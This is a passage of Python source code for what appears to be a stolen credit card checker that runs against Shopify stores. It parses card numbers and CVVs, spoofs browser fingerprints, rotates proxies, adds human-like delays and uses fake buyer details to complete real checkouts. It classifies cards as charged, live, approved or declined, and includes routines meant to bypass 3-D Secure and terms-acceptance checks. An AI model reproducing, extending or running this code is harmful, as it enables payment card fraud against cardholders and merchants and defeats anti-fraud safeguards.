        checkout_url = original_payload.get("variables", {}).get("input", {}).get("analytics", {}).get("requestUrl", "")
        if not checkout_url:
            checkout_url = f"{site_url}/checkout"
        
        ref = await session.get(
            checkout_url,
            headers={
                "User-Agent": shop.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
        )
        
        if ref.status_code == 200:
            rt = ref.text
            # Try to find terms acceptance related tokens
            terms_token = None
            for pattern in [
                'termsToken&quot;:&quot;', 'acceptTermsToken&quot;:&quot;',
                'pendingTermsToken&quot;:&quot;', '"termsToken":"',
                '"acceptTermsToken":"',
            ]:
                if '&quot;' in pattern:
                    terms_token = find_between(rt, pattern, '&quot;')
                else:
                    terms_token = find_between(rt, pattern, '"')
                if terms_token:
                    _log_verbose(verbose, f"[terms] Found terms token: {terms_token[:30]}...")
                    break
            
            # Refresh session token & queue token
            nst = _RE_SESSION_TOKEN.search(rt)
            if nst:
                original_payload["variables"]["input"]["sessionInput"]["sessionToken"] = nst.group(1)
                graphql_headers["x-checkout-one-session-token"] = nst.group(1)
            nq = find_between(rt, 'queueToken&quot;:&quot;', '&quot;')
            if nq:
                original_payload["variables"]["input"]["queueToken"] = nq
            
            # Add terms acceptance to payload if token found
            if terms_token:
                # Some Shopify stores require termsAcceptance in checkpointData or as separate field
                if "checkpointData" not in original_payload["variables"]["input"] or not original_payload["variables"]["input"]["checkpointData"]:
                    original_payload["variables"]["input"]["checkpointData"] = {}
                if isinstance(original_payload["variables"]["input"]["checkpointData"], dict):
                    original_payload["variables"]["input"]["checkpointData"]["termsToken"] = terms_token
                    original_payload["variables"]["input"]["checkpointData"]["acceptedTerms"] = True
                    _log_verbose(verbose, "[terms] Injected termsToken into checkpointData")
        
        # Also try setting destinationChanged=False again (sometimes helps)
        try:
            delivery = original_payload["variables"]["input"].get("delivery", {})
            for line in delivery.get("deliveryLines", []):
                if "destinationChanged" in line:
                    line["destinationChanged"] = False
        except Exception:
            pass
        
        # New attempt token
        original_payload["variables"]["attemptToken"] = f"terms-bypass-{random.random()}"
        
        await asyncio.sleep(1.0)
        resp = await session.post(graphql_url, headers=graphql_headers, json=original_payload)
        
        if resp.status_code == 200:
            data = resp.json()
            completion = data.get("data", {}).get("submitForCompletion", {}) or {}
            receipt = completion.get("receipt")
            if receipt and receipt.get("id"):
                _log_verbose(verbose, "[terms] ✅ Bypass SUCCESS — receipt obtained!")
                return {"bypassed": True, "response": data, "receipt": receipt}
            
            # Check if terms error persists
            errors = completion.get("errors", [])
            error_codes = [e.get("code") for e in errors if e.get("code")]
            if "WAITING_PENDING_TERMS" in error_codes:
                _log_verbose(verbose, "[terms] ❌ Bypass failed — terms still pending")
                return {"bypassed": False, "error": "WAITING_PENDING_TERMS persists", "response": data}
            
            return {"bypassed": False, "error": f"Different response: {completion.get('__typename')}", "response": data}
        
        return {"bypassed": False, "error": f"HTTP {resp.status_code}"}
    
    except Exception as e:
        _log_verbose(verbose, f"[terms] Bypass exception: {str(e)[:150]}")
        return {"bypassed": False, "error": str(e)[:200]}

# ═══════════════════════════════════════════════════════════════════════
# FAST SITE CHECK
# ═══════════════════════════════════════════════════════════════════════
async def check_site_fast(site_url, proxy_url=None, max_price=MAX_PRICE, min_price=MIN_PRICE):
    site_url = site_url.strip().rstrip("/")
    fingerprint = get_random_fingerprint()
    product_header = {
        "User-Agent": fingerprint.get("User-Agent", _FALLBACK_UA),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": site_url,
        "Origin": site_url,
        "DNT": "1",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    _proxy_fmt = None
    if proxy_url:
        _proxy_fmt = format_proxy(proxy_url) if isinstance(proxy_url, str) else proxy_url
    try:
        async with _create_async_client(proxy_url=_proxy_fmt, timeout=12.0, chrome_version=fingerprint.get("_chrome_ver")) as client:
            r = await client.get(site_url + "/products.json", headers=product_header)
            if r.status_code != 200:
                return {"ok": False, "price": None, "product": "", "available": False, "error": f"HTTP {r.status_code}"}
            try:
                data = r.json()
            except Exception:
                return {"ok": False, "price": None, "product": "", "available": False, "error": "Not a Shopify store"}
            products = data.get("products") or []
            if not products:
                return {"ok": False, "price": None, "product": "", "available": False, "error": "No products found"}
            lowest_price = None
            lowest_product = None
            lowest_variant = None
            for product in products:
                for v in product.get("variants") or []:
                    available = v.get("available", True)
                    if isinstance(available, str):
                        available = available.lower() in ("true", "1", "yes")
                    if not available:
                        continue
                    price_str = v.get("price") or "0"
                    try:
                        price_val = float(str(price_str).replace("$", "").replace(",", "").strip())
                    except (ValueError, TypeError):
                        continue
                    if price_val < min_price:
                        continue
                    if lowest_price is None or price_val < lowest_price:
                        lowest_price = price_val
                        lowest_product = product
                        lowest_variant = v
            if lowest_product is None or lowest_variant is None:
                return {"ok": False, "price": None, "product": "", "available": False, "error": f"No products between ${min_price:.2f}-${max_price:.2f}"}
            price_str = lowest_variant.get("price") or "0"
            ok = lowest_price <= max_price
            result = {
                "ok": ok,
                "price": price_str,
                "product": lowest_product.get("title", "")[:60],
                "available": True,
                "lowest_price": lowest_price,
            }
            if not ok:
                result["error"] = f"Price ${lowest_price:.2f} exceeds max ${max_price:.2f}"
            return result
    except _NETWORK_ERRORS as e:
        _ename = type(e).__name__
        if "Timeout" in _ename:
            return {"ok": False, "price": None, "product": "", "available": False, "error": "Timeout (12s)"}
        elif "Connect" in _ename:
            return {"ok": False, "price": None, "product": "", "available": False, "error": "Cannot connect"}
        else:
            return {"ok": False, "price": None, "product": "", "available": False, "error": f"Network: {_ename}"}
    except Exception as e:
        error_msg = str(e)[:50]
        if "SSL" in error_msg or "certificate" in error_msg.lower():
            return {"ok": False, "price": None, "product": "", "available": False, "error": "SSL error"}
        return {"ok": False, "price": None, "product": "", "available": False, "error": error_msg}

# ═══════════════════════════════════════════════════════════════════════
# MAIN CHECK
# ═══════════════════════════════════════════════════════════════════════
async def run_shopify_check(site_url, card_str, proxy_url=None, timeout=120.0, verbose=True):
    global _active_checks, _check_semaphore
    if _check_semaphore is None:
        _check_semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
    async with _check_semaphore:
        _active_checks += 1
        try:
            return await _run_shopify_check_inner(site_url, card_str, proxy_url, verbose, timeout)
        finally:
            _active_checks -= 1


async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=True, timeout=120.0):
    site_url = site_url.strip().rstrip("/")
    parts = card_str.strip().replace(" ", "").split("|")
    if len(parts) != 4:
        return {"status": "Error", "message": "Invalid card format"}
    cc, mon, year, cvv = parts

    proxy_list = []
    if proxy_url:
        if "," in proxy_url:
            proxy_list = [format_proxy(p.strip()) for p in proxy_url.split(",") if p.strip()]
            proxy_list = [p for p in proxy_list if p]
        else:
            f = format_proxy(proxy_url)
            if f:
                proxy_list = [f]

    proxy_use = random.choice(proxy_list) if proxy_list else None
    fingerprint = get_random_fingerprint()

    try:
        async with _create_async_client(proxy_url=proxy_use, timeout=20.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
            result = await asyncio.wait_for(
                _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_use, verbose),
                timeout=float(timeout),
            )
            return result
    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Timeout"}
    except Exception as e:
        return {"status": "Error", "message": str(e)[:200]}


async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=None, verbose=False):
    site = site_url
    shop = ShopifyAuto(fingerprint=fingerprint)
    product_header = {k: v for k, v in fingerprint.items() if k.lower() in _HEADER_FILTER_FULL}
    if not any(k.lower() == "user-agent" for k in product_header):
        product_header["User-Agent"] = shop.user_agent

    try:
        home_headers = dict(product_header)
        home_headers["Sec-Fetch-Dest"] = "document"
        home_headers["Sec-Fetch-Mode"] = "navigate"
        home_headers["Sec-Fetch-Site"] = "none"
        home_headers["Sec-Fetch-User"] = "?1"
        await session.get(site, headers=home_headers)
        await asyncio.sleep(random.uniform(0.3, 0.9))
    except Exception:
        pass

    try:
        cached = _get_cached_products(site)
        if cached:
            products = cached
        else:
            product_response = await session.get(site + "/products.json", headers=product_header)
            if product_response.status_code != 200:
                return {"status": "Error", "message": f"Products HTTP {product_response.status_code}"}
            try:
                products_data = product_response.json()
            except Exception:
                return {"status": "Error", "message": "Products not JSON"}
            products = products_data.get("products") or []
            if products:
                _set_cached_products(site, products)
        if not products:
            return {"status": "Error", "message": "No products found"}

        lowest_price = None
        lowest_product = None
        lowest_variant = None
        for product in products:
            for v in product.get("variants") or []:
                avail = v.get("available", True)
                if isinstance(avail, str):
                    avail = avail.lower() in ("true", "1", "yes")
                if not avail:
                    continue
                try:
                    price_val = float(str(v.get("price", "0")).replace("$", "").replace(",", "").strip())
                except (ValueError, TypeError):
                    continue
                if price_val < MIN_PRICE or price_val > MAX_PRICE:
                    continue
                if lowest_price is None or price_val < lowest_price:
                    lowest_price = price_val
                    lowest_product = product
                    lowest_variant = v

        if not lowest_product or not lowest_variant:
            return {"status": "Error", "message": "No products in price range"}

        product_handle = lowest_product["handle"]
        variant_id = lowest_variant["id"]
        price = lowest_variant["price"]
        product_title = lowest_product["title"]
        _log_verbose(verbose, f"[check] {product_title[:40]} ${price} | variant={variant_id}")
    except Exception as e:
        return {"status": "Error", "message": f"Product fetch: {str(e)[:100]}"}

    try:
        await asyncio.sleep(random.uniform(0.4, 1.2))
        browse_headers = dict(product_header)
        browse_headers["Referer"] = site + "/"
        browse_headers["Sec-Fetch-Dest"] = "document"
        browse_headers["Sec-Fetch-Mode"] = "navigate"
        browse_headers["Sec-Fetch-Site"] = "same-origin"
        browse_headers["Sec-Fetch-User"] = "?1"
        try:
            await session.get(f"{site}/collections/all", headers=browse_headers)
            await asyncio.sleep(random.uniform(0.3, 0.8))
        except Exception:
            pass
        browse_headers["Referer"] = f"{site}/collections/all"
        try:
            await session.get(f"{site}/products/{product_handle}", headers=browse_headers)
        except Exception:
            pass
        await asyncio.sleep(random.uniform(0.5, 1.5))
        cart_add_headers = dict(product_header)
        cart_add_headers["Referer"] = f"{site}/products/{product_handle}"
        cart_add_headers["Sec-Fetch-Dest"] = "empty"
        cart_add_headers["Sec-Fetch-Mode"] = "cors"
        cart_add_headers["Sec-Fetch-Site"] = "same-origin"
        cart_add_headers["content-type"] = "application/x-www-form-urlencoded"
        cart_add_headers["origin"] = site
        cart_add_headers["X-Requested-With"] = "XMLHttpRequest"
        cart_add_headers.pop("Sec-Fetch-User", None)
        cart_add_headers.pop("Upgrade-Insecure-Requests", None)

        add_data = {"id": str(variant_id), "quantity": "1", "form_type": "product"}
        response = await session.post(site + "/cart/add.js", headers=cart_add_headers, data=add_data)
        if response.status_code != 200:
            return {"status": "Error", "message": "Cart add failed"}

        await asyncio.sleep(random.uniform(0.3, 0.8))
        cart_response = await session.get(f"{site}/cart.js", headers=cart_add_headers)
        try:
            cart_data = cart_response.json()
        except Exception:
            return {"status": "Error", "message": "Cart JSON parse failed"}
        token = cart_data.get("token")
        if not token:
            return {"status": "Error", "message": "No cart token"}
    except _NETWORK_ERRORS as e:
        return {"status": "Error", "message": f"Network: {type(e).__name__}"}

    await asyncio.sleep(random.uniform(0.5, 1.2))

    checkout_headers = {
        "User-Agent": fingerprint.get("User-Agent", shop.user_agent),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "content-type": "application/x-www-form-urlencoded",
        "origin": site,
        "referer": f"{site}/cart",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
    }
    for ch in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Ch-Ua-Full-Version-List"):
        if ch in fingerprint:
            checkout_headers[ch] = fingerprint[ch]

    try:
        checkout_response = await session.post(f"{site}/cart", headers=checkout_headers, data={"checkout": "", "updates[]": "1"})
    except _NETWORK_ERRORS as e:
        return {"status": "Error", "message": f"Network: {type(e).__name__}"}

    checkout_page_url = str(checkout_response.url)
    response_text2 = checkout_response.text
    x_st = _RE_SESSION_TOKEN.search(response_text2)
    session_token = x_st.group(1) if x_st else None
    if not session_token:
        return {"status": "Error", "message": "Checkout session failed"}
    queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
    stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
    paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
    _checkpoint_token = find_between(response_text2, 'checkpointToken&quot;:&quot;', '&quot;')
    if not _checkpoint_token:
        _checkpoint_token = find_between(response_text2, 'captchaToken&quot;:&quot;', '&quot;')
    if not _checkpoint_token:
        _checkpoint_token = find_between(response_text2, '"checkpointToken":"', '"')
    _checkpoint_data = {"token": _checkpoint_token} if _checkpoint_token else None
    delivery_line_stable_id = _extract_delivery_line_stable_id(response_text2)
    requires_shipping = _detect_requires_shipping(response_text2)
    if requires_shipping is None:
        requires_shipping = True
    delivery_strategy_handle = _extract_delivery_strategy_handle(response_text2)
    delivery_option_handle = None

    random_info = shop.get_random_info()
    fname, lname = random_info["fname"], random_info["lname"]
    email, phone = random_info["email"], random_info["phone"]
    add1 = random_info["add1"]
    city = random_info["city"]
    state_short = random_info["state_short"]
    zip_code = str(random_info["zip"])

    await asyncio.sleep(random.uniform(1.0, 2.5))

    _token_endpoints = [
        "https://deposit.us.shopifycs.com/sessions",
        "https://checkout.pci.shopifyinc.com/sessions",
        "https://checkout.shopifycs.com/sessions",
    ]
    _card_json = {"credit_card": {"number": cc, "month": mon, "year": year, "verification_value": cvv, "name": f"{fname} {lname}"}, "payment_session_scope": urlparse(site_url).netloc}
    _tok_headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://checkout.shopifycs.com",
        "referer": "https://checkout.shopifycs.com/",
        "user-agent": shop.user_agent,
        "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
    }
    for ch in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
        if ch in fingerprint:
            _tok_headers[ch.lower()] = fingerprint[ch]

    async def _try_tokenize_sequential(endpoints, px=None):
        try:
            async with _create_async_client(proxy_url=px, timeout=15.0, chrome_version=fingerprint.get("_chrome_ver")) as tok_sess:
                for ep in endpoints:
                    try:
                        r = await tok_sess.post(ep, headers=_tok_headers, json=_card_json)
                        if r.status_code == 200:
                            sid = r.json().get("id")
                            if sid:
                                return sid
                    except Exception:
                        continue
        except Exception:
            pass
        return None

    async def _tokenize_card():
        sid = await _try_tokenize_sequential(_token_endpoints, px=None)
        if sid:
            return sid
        if proxy_url:
            sid = await _try_tokenize_sequential(_token_endpoints, px=proxy_url)
            if sid:
                return sid
        return None

    sessionid = await _tokenize_card()
    if not sessionid:
        return {"status": "Error", "message": "Payment session failed"}

    graphql_url = f"{site_url}/checkouts/unstable/graphql"

    def _make_graphql_headers():
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": site_url,
            "referer": f"{site_url}/",
            "user-agent": shop.user_agent,
            "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
            "accept-encoding": "gzip, deflate, br, zstd",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-checkout-one-session-token": session_token,
            "x-checkout-web-deploy-stage": "production",
            "x-checkout-web-server-handling": "fast",
            "x-checkout-web-source-id": token.split("?")[0] if "?" in token else token,
        }
        for ch in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Ch-Ua-Full-Version-List"):
            if ch in fingerprint:
                h[ch] = fingerprint[ch]
        return h

    def _delivery_kwargs():
        return dict(requires_shipping=requires_shipping, delivery_strategy_handle=delivery_strategy_handle, delivery_option_handle=delivery_option_handle)

    neg_got_receipt = False
    await asyncio.sleep(random.uniform(0.8, 1.8))
    if requires_shipping:
        neg_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}"
        neg_payload = {
            "query": _SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": _checkpoint_data,
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, **_delivery_kwargs()),
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "merchandise": {
                                "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": paymentMethodIdentifier,
                                    "sessionId": sessionid,
                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                },
                            },
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                    },
                    "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{token}-neg-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": f"{site_url}/checkouts/cn/{token}", "pageId": neg_page_id},
            },
            "operationName": "SubmitForCompletion",
        }
        neg_resp = await session.post(graphql_url, headers=_make_graphql_headers(), json=neg_payload)
        if neg_resp.status_code == 200:
            neg_data = neg_resp.json()
            neg_completion = neg_data.get("data", {}).get("submitForCompletion", {}) or {}
            neg_receipt = neg_completion.get("receipt")
            if neg_receipt and neg_receipt.get("id"):
                neg_got_receipt = True

        if neg_got_receipt:
            receipt = neg_receipt
            receipt_id = receipt.get("id")
            if receipt.get("__typename") == "ProcessingReceipt":
                for _ in range(8):
                    await asyncio.sleep(0.5)
                    poll_r = await session.post(graphql_url, headers=_make_graphql_headers(), json={"query": _POLL_QUERY, "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                    if poll_r.status_code != 200:
                        continue
                    rec = poll_r.json().get("data", {}).get("receipt", {}) or {}
                    rtn = rec.get("__typename")
                    if rtn == "ProcessedReceipt" or rec.get("orderIdentity"):
                        return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price}
                    if rtn == "ActionRequiredReceipt":
                        bypass = await try_3ds_bypass(rec.get("action", {}).get("offsiteRedirect", {}).get("url", site_url), proxy_url)
                        if bypass.get("bypassed"):
                            return {"status": "Charged", "message": "CARD CHARGED (3DS bypassed)"}
                        return {"status": "Approved", "message": "3DS Required (bypass failed)", "error_code": "3DS_REQUIRED", "product": product_title, "price": price}
                    if rtn == "FailedReceipt":
                        err = rec.get("processingError", {}) or {}
                        code = err.get("code", "UNKNOWN")
                        live = classify_ccn_live(code)
                        if live:
                            return {"status": "Charged", "message": f"CCN LIVE — {code}", "error_code": code, "ccn_live": True, "product": product_title, "price": price}
                        return {"status": "Declined", "message": code, "error_code": code, "product": product_title, "price": price}
            elif receipt.get("__typename") == "ActionRequiredReceipt":
                bypass = await try_3ds_bypass(receipt.get("action", {}).get("offsiteRedirect", {}).get("url", site_url), proxy_url)
                if bypass.get("bypassed"):
                    return {"status": "Charged", "message": "CARD CHARGED (3DS bypassed)"}
                return {"status": "Approved", "message": "3DS Required (bypass failed)", "error_code": "3DS_REQUIRED", "product": product_title, "price": price}
            elif receipt.get("__typename") == "FailedReceipt":
                err = receipt.get("processingError", {}) or {}
                code = err.get("code", "UNKNOWN")
                live = classify_ccn_live(code)
                if live:
                    return {"status": "Charged", "message": f"CCN LIVE — {code}", "error_code": code, "ccn_live": True, "product": product_title, "price": price}
                return {"status": "Declined", "message": code, "error_code": code, "product": product_title, "price": price}
            elif receipt.get("__typename") == "ProcessedReceipt" or receipt.get("orderIdentity"):
                return {"status": "Charged", "message": "CARD CHARGED", "order_id": receipt.get("orderIdentity", {}).get("id"), "product": product_title, "price": price}

        try:
            ref = await session.get(checkout_page_url, headers={"User-Agent": shop.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
            if ref.status_code == 200:
                rt = ref.text
                nst = _RE_SESSION_TOKEN.search(rt)
                if nst:
                    session_token = nst.group(1)
                nq = find_between(rt, 'queueToken&quot;:&quot;', '&quot;')
                if nq:
                    queue_token = nq
                ns = find_between(rt, 'stableId&quot;:&quot;', '&quot;')
                if ns:
                    stable_id = ns
                np_ = find_between(rt, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                if np_:
                    paymentMethodIdentifier = np_
                nd = _extract_delivery_line_stable_id(rt)
                if nd:
                    delivery_line_stable_id = nd
                nds = _extract_delivery_strategy_handle(rt)
                if nds:
                    delivery_strategy_handle = nds
        except Exception:
            pass

        new_sid = await _tokenize_card()
        if new_sid:
            sessionid = new_sid

    for attempt in range(1):
        graphql_headers = _make_graphql_headers()
        random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}"
        graphql_payload = {
            "query": _SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": _checkpoint_data,
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=False, **_delivery_kwargs()),
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "merchandise": {
                                "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": paymentMethodIdentifier,
                                    "sessionId": sessionid,
                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                },
                            },
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                    },
                    "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": f"{site_url}/checkouts/cn/{token}", "pageId": random_page_id},
            },
            "operationName": "SubmitForCompletion",
        }

        gr = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
        if gr.status_code != 200:
            return {"status": "Error", "message": f"GraphQL {gr.status_code}"}

        result_data = gr.json()
        completion = result_data.get("data", {}).get("submitForCompletion", {}) or {}

        if completion.get("errors"):
            error_codes = [e.get("code") for e in completion["errors"] if e.get("code")]

            # ── WAITING_PENDING_TERMS BYPASS ATTEMPT ──
            if "WAITING_PENDING_TERMS" in error_codes or "TAX_NEW_TAX_MUST_BE_ACCEPTED" in error_codes or "PENDINGTERMVIOLATION" in error_codes:
                terms_result = await _attempt_terms_bypass(
                    session, graphql_url, graphql_headers,
                    json.loads(json.dumps(graphql_payload)),  # deep copy
                    site_url, shop, verbose
                )
                if terms_result.get("bypassed"):
                    receipt = terms_result.get("receipt")
                    if receipt:
                        rtn = receipt.get("__typename")
                        if rtn == "ProcessedReceipt" or receipt.get("orderIdentity"):
                            return {"status": "Charged", "message": "CARD CHARGED (terms bypassed)", "order_id": receipt.get("orderIdentity", {}).get("id"), "product": product_title, "price": price}
                        elif rtn == "ProcessingReceipt":
                            # poll for result
                            rid = receipt.get("id")
                            for _ in range(6):
                                await asyncio.sleep(0.6)
                                poll_r = await session.post(graphql_url, headers=graphql_headers, json={"query": _POLL_QUERY, "variables": {"receiptId": rid, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                                if poll_r.status_code == 200:
                                    rec = poll_r.json().get("data", {}).get("receipt", {}) or {}
                                    if rec.get("__typename") == "ProcessedReceipt" or rec.get("orderIdentity"):
                                        return {"status": "Charged", "message": "CARD CHARGED (terms bypassed)", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price}
                                    if rec.get("__typename") == "FailedReceipt":
                                        err = rec.get("processingError", {}) or {}
                                        code = err.get("code", "UNKNOWN")
                                        if classify_ccn_live(code):
                                            return {"status": "Charged", "message": f"CCN LIVE — {code}", "error_code": code, "ccn_live": True, "product": product_title, "price": price}
                                        return {"status": "Declined", "message": code, "error_code": code, "product": product_title, "price": price}
                            return {"status": "Error", "message": "Terms bypassed but poll timeout", "product": product_title, "price": price}
                        else:
                            return {"status": "Error", "message": f"Terms bypassed but receipt type: {rtn}", "product": product_title, "price": price}
                # Bypass failed — return the terms error
                return {
                    "status": "Error",
                    "message": "WAITING_PENDING_TERMS (site-side terms acceptance required — bypass failed)",
                    "error_code": "WAITING_PENDING_TERMS",
                    "product": product_title,
                    "price": price,
                }

            approval_hits = [c for c in error_codes if c in APPROVAL_CODES]
            decline_hits = [c for c in error_codes if c in DECLINE_CODES or c.startswith("PAYMENTS_CREDIT_CARD_BASE_")]
            site_hits = [c for c in error_codes if c in SITE_SKIP_CODES]

            if approval_hits:
                code = approval_hits[0]
                live = classify_ccn_live(code)
                if live:
                    return {"status": "Charged", "message": f"CCN LIVE — {code}", "error_code": code, "ccn_live": True, "product": product_title, "price": price}
                return {"status": "Approved", "message": "Card approved by gateway", "error_code": code, "product": product_title, "price": price}
            if decline_hits:
                return {"status": "Declined", "message": "Card declined", "error_code": decline_hits[0], "product": product_title, "price": price}
            if site_hits:
                return {"status": "Error", "message": f"Site incompatible: {error_codes[0]}", "error_code": "SITE_INCOMPATIBLE", "product": product_title, "price": price}

            if "CHECKPOINT_DENIED" in error_codes or "CAPTCHA" in str(error_codes).upper():
                return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "_checkout_url": checkout_page_url}

            return {"status": "Error", "message": f"Submit errors: {error_codes}", "product": product_title, "price": price}

        receipt = completion.get("receipt")
        if not receipt:
            tn = completion.get("__typename", "?")
            reason = completion.get("reason", "")
            if tn == "CheckpointDenied":
                redirect_url = completion.get("redirectUrl") or checkout_page_url
                return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "_checkout_url": redirect_url}
            if tn in ("Throttled", "TooManyRequests"):
                return {"status": "Error", "message": "Throttled by Shopify", "error_code": "THROTTLED", "product": product_title, "price": price}
            return {"status": "Error", "message": f"No receipt ({tn})", "product": product_title, "price": price}

